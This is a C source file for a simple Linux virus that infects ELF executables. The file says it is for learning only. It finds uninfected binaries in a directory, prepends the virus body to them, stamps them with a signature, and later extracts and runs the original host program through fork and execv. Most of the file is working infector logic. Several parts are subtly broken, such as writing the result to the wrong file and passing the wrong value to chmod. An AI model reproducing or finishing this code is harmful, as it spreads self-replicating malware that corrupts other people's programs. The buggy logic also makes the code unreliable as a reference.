/*
 * file_utilities.c
 *
 * Created on: Jan 3, 2022
 * Note: This piece of software is designed only for learning and training purposes.
 * Building a virus program with relatively ease should increase your awareness on system vulnerabilities at all times.
 */

#include "file_utilities.h"

long what_is_the_file_length(char *file_name)
{
	long length_of_file=0;
	FILE *pFile=fopen(file_name,"rb");

	if(!pFile)
	{
#ifdef DEBUGMODE
		perror("Error when creating file pointer.");
#endif
		return (-1);
	}
	else
	{
		fseek(pFile,0, SEEK_END);
		length_of_file=ftell(pFile);
		fseek(pFile,0,SEEK_SET);
	}

	fclose(pFile);
	pFile=NULL;

	return length_of_file;
}

int verify_is_elf(char *file_name)
{
	/* ==============================================================================================================================================================================
	 * A common misconception is that ELF files are just for binaries or executables. But they can be used for partial pieces (object code).
	 * Another example is shared libraries or even core dumps (those core or a.out files). The ELF specification is also used on Linux for the kernel itself and Linux kernel modules.
	 * ==============================================================================================================================================================================
	 */

	/* =================================================================================================================
	 * The first 4 hexadecimal parts define that this is an ELF file (0x45=E,0x4c=L,0x46=F), prefixed with the 0x7f value.
	 * So, the order in the ELF Header should be 0x7f, 0x45, 0x4c, 0x46
	 * ==================================================================================================================
	 */

	FILE *pFile=fopen(file_name,"rb"); // "rb" parameter goes similarly like "r", but "rb" is used for binary files as it does not provide "translation" as per the OS particulars for the end of line character "\n"

	if(!pFile)
	{
#ifdef DEBUGMODE
		perror("Error when creating the file pointer.");
#endif
		return (-1);
	}
	else
	{
		char my_buffer[4];

		int i;
		for(i=0;i<4;i++)
		{
			my_buffer[i]=fgetc(pFile);
		}

		fclose(pFile);
		pFile=NULL;

		if(my_buffer[0]==0x7f && my_buffer[1]==0x45 && my_buffer[2]==0x4c && my_buffer[3]==0x46)
		{
			return true;
		}
		else
		{
			return false;
		}
	}

}

int verify_if_is_infected(char *file_name, char *virus_signature,int length_of_signature )
{
	char my_buffer[length_of_signature+1]; // +1 will be added for the '\0' so to say null ending character for the string

	FILE *pFile=fopen(file_name,"rb");

	if(!pFile)
	{
#ifdef DEBUGMODE
		perror("Error when creating file pointer.");
#endif
		return (-1);
	}
	else
	{
		fseek(pFile, (length_of_signature * -1),SEEK_END);

		int i;
		for(i=0;i<length_of_signature;i++)
		{
			my_buffer[i]=fgetc(pFile);
		}

		my_buffer[length_of_signature]='\0';

		fclose(pFile);
		pFile=NULL;

		if(!strcmp(my_buffer,virus_signature))
		{
#ifdef DEBUGMODE
			puts("True, it is already infected.");
#endif

			return true; // 'true'(=1) and 'false'(=0) given to you by the power of #include <stdbool.h> :)
		}
		else
		{
#ifdef DEBUGMODE
			puts("False  it not infected.");
#endif
			return false;
		}
	}
}

int verify_is_original_file(char *file_name, char *virus_file_name)
{
	if(!strcmp(file_name,virus_file_name))
	{
		return true;
	}
	else
	{
		return false;
	}
}

char *search_for_target(char *path_to_target_directory, char *virus_file_name, char *virus_signature, long length_of_signature)
{

#ifdef DEBUGMODE
	printf("I am here. Searching for targets to infect in the directory --> %s an using the virus file --> %s whose signature is %s and length of signature is %ld.\n",
			path_to_target_directory, virus_file_name, virus_signature,length_of_signature);
#endif


	struct dirent *my_dir_struct;

	/* -----------------------------------------------------------------------------------
	 * struct dirent refers to directory entry.
	 * struct dirent
	 * {
    ino_t          d_ino;       // inode number
    off_t          d_off;       // offset to the next dirent
    unsigned short d_reclen;    // length of this record
    unsigned char  d_type;      // type of file; not supported by all file system types
    char           d_name[256]; //filename
        };
        -----------------------------------------------------------------------------------
	 */

	DIR *my_directory=opendir(path_to_target_directory);

	if(my_directory==NULL)
	{
		return NULL;
	}
	else
	{
		while((my_dir_struct=readdir(my_directory))!=NULL)
		{
			char *string_filename=my_dir_struct->d_name;

#ifdef DEBUGMODE
			printf("Hey, Alligators... Right now I am busy infecting this file \t ---> %s .\n",string_filename);
#endif

			if(!strcmp(string_filename,".") || !strcmp(string_filename,".."))
			{
				continue;
			}
			else
			{
               puts("fuck ya");
				if(!verify_if_is_infected(string_filename, virus_signature, length_of_signature) && verify_is_elf(string_filename) && !verify_is_original_file(string_filename, virus_file_name))		{
					{
						closedir(my_directory);


			printf("This file is not infected yet \t ---> %s  --> so I am going to infect it now.\n",string_filename);

						return(string_filename);
					}
				}
			}
			closedir(my_directory);
		}
	}
}

	void execute_virus_mission()
	{
		puts("Hello, I am a simple virus. Yet, I can be deadly. Did you have your medicine today??");
	}

	// I stamp any infected file so that one can recognize it later against the healthy ones. Day Z zombie day, right??
	void stamp_the_infected_file(char *file_name, char *virus_signature)
	{

#ifdef DEBUGMODE
		printf("%s -> %s", __FILE__,__func__);
#endif

		FILE *pFile=fopen(file_name,"ab"); //"ab" goes for 'append binary..."

		if(!pFile)
		{
	#ifdef DEBUGMODE
			perror("Error when creating file pointer.");
	#endif
		}
		else
		{
			int i;
			for(i=0;i<strlen(virus_signature);i++)
			{
				fputc(virus_signature[i],pFile);
			}
		}

#ifdef DEBUGMODE
		printf("Hey, I stamped the following file as infected ---> %s with the signature [ %s ]. \n", file_name, virus_signature);
#endif

		fclose(pFile);
		pFile=NULL;
	}

	int go_infect_the_target_file(char *target_binary_file_name,char *virus_binary_file_name, long size_of_virus)
	{

#ifdef DEBUGMODE
		printf("%s -> %s .\n", __FILE__,__func__);
		printf("I am executing this function with the parameters 'target' -->%s , 'virus-binary' ---> %s, 'size of virus' ---> %ld .\n",target_binary_file_name,virus_binary_file_name,size_of_virus);
#endif

		printf("the target %s.\n",target_binary_file_name);

		char *temp=(char *) malloc(sizeof(char) * (strlen(target_binary_file_name)+1));
		strcpy(temp, target_binary_file_name);
		printf("the target %s.\n",target_binary_file_name);
		printf("the temp %s.\n",temp);

		long size_of_target=what_is_the_file_length(temp);
		long final_infected_binary[size_of_virus + size_of_target];
		long i=0;

		FILE *pVirusFile=fopen(virus_binary_file_name,"rb");

		if(!pVirusFile)
		{
		#ifdef DEBUGMODE
			perror("Error when creating virus file pointer.");
		#endif
		}
		else
		{
			for (; i < size_of_virus; i++)
			{
				final_infected_binary[i]=fgetc(pVirusFile);
			}
		}

		fclose(pVirusFile);
		pVirusFile=NULL;

		printf("the target %s.\n",temp);

		FILE *pTargetBinaryFile=fopen(temp,"rb");

		if(!pTargetBinaryFile)
		{
#ifdef DEBUGMODE
			perror("Error when creating target file pointer.");
			printf("Error when creating a file pointer to %s.\n",target_binary_file_name);
#endif
		}
		else
		{
			for(;i<size_of_virus+size_of_target;i++)
			{
				final_infected_binary[i]=fgetc(pTargetBinaryFile);
			}
		}

		fclose(pTargetBinaryFile);
		pTargetBinaryFile=NULL;

		FILE *pNewTargetBinaryFile=fopen(virus_binary_file_name,"wb");

		if(!pNewTargetBinaryFile)
		{
#ifdef DEBUGMODE
	perror("Error when creating file pointer.");
#endif
		return false;
		}
		else
		{
			for(int j=0;j<size_of_virus+size_of_target;j++)
			{
				fputc(final_infected_binary[j],pNewTargetBinaryFile);
			}

			fclose(pNewTargetBinaryFile);
			pNewTargetBinaryFile=NULL;

			return true;
		}
	}

	void extract_action_from_virus(char *binary_file_name, char *temporary_file_name, long size_of_virus, long length_of_signature)
	{
#ifdef DEBUGMODE
		printf("%s -> %s", __FILE__,__func__);
#endif

		long size_of_binary=what_is_the_file_length(binary_file_name);

		FILE *pBinaryFile=fopen(binary_file_name,"rb");
		FILE *pTemporaryFile=fopen(temporary_file_name,"wb");

		fseek(pBinaryFile,size_of_virus,SEEK_SET);

		long i;
		for(i=0;i<size_of_binary-size_of_virus-length_of_signature;i++)
		{
			fputc(fgetc(pBinaryFile),pTemporaryFile);
		}

		fclose(pBinaryFile);
		fclose(pTemporaryFile);

		char accessmode[]="0755";
		char *ptr;
		int access=strtol(accessmode,&ptr,8);

		if(chmod(temporary_file_name,i)<0)
		{
#ifdef DEBUGMODE
			perror("Error when applying chmod() function");
#endif
		}
	}

	void execute_action(char *file_name, char *argv[], char *temporary_file_name, long size_of_virus, long length_of_signature)
	{
#ifdef DEBUGMODE
		printf("%s -> %s", __FILE__,__func__);
#endif

		extract_action_from_virus(file_name, temporary_file_name, size_of_virus, length_of_signature);

		pid_t process_id=fork();

		if(process_id==0)
		{
			//executing this from the newly created child process
			if(execv(temporary_file_name,argv)<0)
			{
#ifdef DEBUGMODE
				perror("Error with execv");
#endif
			}
		}
		else
		{
			//executing this from the old parent
		    waitpid(process_id, NULL, 0);
		    remove(temporary_file_name);
		}

	}
